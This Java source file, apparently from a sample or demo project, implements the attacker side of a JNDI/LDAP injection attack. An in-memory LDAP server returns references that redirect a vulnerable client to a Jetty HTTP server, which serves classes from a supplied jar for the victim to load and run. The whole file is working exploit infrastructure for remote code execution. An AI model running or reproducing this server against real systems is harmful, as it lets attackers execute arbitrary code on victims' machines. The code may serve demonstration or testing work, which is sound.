package sample.attacker;

import java.nio.file.Paths;

import org.eclipse.jetty.server.Server;
import org.eclipse.jetty.server.handler.ResourceHandler;
import org.eclipse.jetty.util.resource.Resource;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

import com.unboundid.ldap.listener.InMemoryDirectoryServer;
import com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;
import com.unboundid.ldap.listener.InMemoryListenerConfig;
import com.unboundid.ldap.sdk.Attribute;

public class Attacker {
    
    private final Logger logger = LoggerFactory.getLogger(getClass());

    public static void main(String[] args) {
        new Attacker().run(args);
    }
    
    private void run(String[] args) {
        if(args.length != 5) {
            logger.error("Invalid arguments, syntax is: java {} <hostname> <ldapPort> <class> <httpPort> <jarPath>", getClass().getName());
            return;
        }
        runLdapServer(Integer.valueOf(args[1]), "http://" + args[0] + ":" + args[3] + "/", args[2]);
        runWebServer(Integer.valueOf(args[3]), args[4]);
    }
    
    private void runLdapServer(int ldapPort, String refBaseUrl, String refClassName) {
        try {
            logger.info("Starting LDAP server on port {}, redirecting to {} at {}", ldapPort, refClassName, refBaseUrl);
            InMemoryDirectoryServerConfig config = new InMemoryDirectoryServerConfig("dc=sample");
            config.setListenerConfigs(InMemoryListenerConfig.createLDAPConfig("LDAP", ldapPort));
            config.addInMemoryOperationInterceptor(new ReferenceInterceptor(refBaseUrl, refClassName));
            InMemoryDirectoryServer server = new InMemoryDirectoryServer(config);
            server.add("dc=sample", //
                    new Attribute("objectclass", "top"), //
                    new Attribute("objectclass", "domain"), //
                    new Attribute("dc", "sample")); //
            server.add("cn=foo,dc=sample", //
                    new Attribute("objectclass", "top"), //
                    new Attribute("objectclass", "person"), //
                    new Attribute("sn", "foo"), //
                    new Attribute("cn", "foo"));
            server.startListening();
            
        } catch (Exception e) {
            logger.error("Unhandled exception in LDAP server:", e);
        }
    }
    
    private void runWebServer(int httpPort, String jarPath) {
        try {
            logger.info("Starting HTTP server on port {}, serving {}", httpPort, jarPath);
            ResourceHandler handler = new ResourceHandler();
            handler.setBaseResource(Resource.newResource("jar:" + Paths.get(jarPath).toUri() + "!/"));
            handler.setDirectoriesListed(true);
            
            Server server = new Server(httpPort);
            server.setHandler(handler);
            server.start();
            
        } catch (Exception e) {
            logger.error("Unhandled exception in HTTP server:", e);
        }
    }
}
